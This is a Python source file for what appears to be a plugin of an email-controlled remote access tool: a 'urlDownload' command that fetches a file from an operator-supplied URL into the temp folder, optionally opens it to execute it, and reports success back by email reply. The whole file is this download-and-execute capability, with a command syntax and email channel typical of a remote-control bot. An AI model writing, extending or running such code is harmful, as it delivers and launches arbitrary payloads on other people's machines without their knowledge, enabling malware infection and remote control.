import requests
import tempfile
import os.path
import os
import subprocess
import platform


class urlDownload:
    def __init__(self):
        self.name = "urlDownload"
        self.info = "Downloads a file from Given Url and Executes It(Not plain text file only bytes)"
        self.args = ["Url: Url To Download","Name: Name to Save the file","Bool: True of False to run after execution"]
        self.command = ":urldown,[Url],[Name],[Bool]"
    
    def open_file(self,filename):
        if platform.system() == "Windows":
            os.startfile(filename)
        elif platform.system() == "Darwin":  # macOS
            subprocess.run(["open", filename])
        else:  # Linux and other Unix-like
            subprocess.run(["xdg-open", filename])


    def getPath(self,name):
        temp_dir = tempfile.gettempdir()
        return os.path.join(temp_dir,name)
    
    def download_file(self,Url,filename,run=False):
        filename =self.getPath(filename)
        try:
            res = requests.get(Url,stream=True)
            res.raise_for_status()
            
            with open(filename, 'wb') as file:
                for chunk in res.iter_content(chunk_size=8192):
                    file.write(chunk)
            
            print(f"Downloaded: {filename}")
            if run:
                self.open_file(filename)
            return True
        except requests.RequestException as e:
            reason = f"Failed to download {filename} from {Url}. Error: {e}"
            print(reason)
        except IOError as e:
            reason =f"Failed to write file {filename}. Error: {e}"
            print(reason)
        except Exception as e:
            reason = f"An unexpected error occurred while downloading {filename}: {e}"
            print(reason)
    
    def run(self,url,filename,run,EmailHandler,msgId):
        resp = self.download_file(
            Url=url,
            filename=filename,
            run=run
        )
        msg = resp
        if resp and run:
            msg = "File Downloaded and executed Congrats"
        elif resp and not run:
            msg = "File Downloaded Congrats"
        EmailHandler.send_email(
            message = msg,
            msgId=msgId,
            reply=True
        )


